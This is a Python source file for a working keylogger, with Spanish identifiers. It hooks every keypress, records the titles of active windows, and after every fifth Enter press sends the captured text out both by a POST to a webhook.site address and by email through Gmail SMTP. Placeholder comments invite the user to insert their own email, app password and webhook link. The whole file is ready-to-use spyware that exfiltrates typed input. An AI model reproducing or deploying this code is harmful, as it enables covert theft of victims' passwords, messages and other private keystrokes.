import keyboard
import requests
import smtplib
from email.mime.text import MIMEText
import pygetwindow as gw


buffer = []
contador_enter = 0

EMAIL_ORIGEN = "EMAIL" #<-------- Your email
EMAIL_DESTINO = "EMAIL" #<----------- Your other email, could be the same
EMAIL_PASS = "**** **** ****" #<------------ Your password app gmail

def obtener_ventana():
    try:
        ventana = gw.getActiveWindow()
        return ventana.title if ventana else "Error"
    except:
        return "Error"

def enviar_correo(texto):
    mensaje = MIMEText(texto)
    mensaje["From"] = EMAIL_ORIGEN
    mensaje["To"] = EMAIL_DESTINO
    mensaje["Subject"] = "Log del Keylogger"

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(EMAIL_ORIGEN, EMAIL_PASS)
        server.send_message(mensaje)

def enviar_buffer():
    global contador_enter
    if buffer:
        texto = ''.join(buffer)
        try:
            requests.post("https://webhook.site/*****************", data={"keys": texto}) #<------ Your link in webhook
            enviar_correo(texto)
        except:
            pass
        buffer.clear()
        contador_enter = 0 

especiales = {
    "ctrl", "shift", "alt", "tab", "mayus", "bloq", "caps lock", "bloq mayus",
    "windows", "num lock", "scroll lock", "pause", "print screen", "menu",
    "apps", "command", "option", "fn", "media play", "media pause",
    "volume up", "volume down", "volume mute", "brightness up", "brightness down",
    "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12"
}

def capturar_tecla(key):
    global contador_enter
    tecla = key.name
    if tecla == "space":
        buffer.append(" ")
    elif tecla == "backspace":
        if buffer:
            buffer.pop()  
    elif tecla == "enter":
        contador_enter += 1
        ventana = obtener_ventana()
        buffer.append(f"\n{ventana}\n")
        if contador_enter >= 5:
            enviar_buffer()
    elif tecla in especiales:
        pass
    else: 
        buffer.append(tecla)

keyboard.on_press(capturar_tecla)
keyboard.wait()
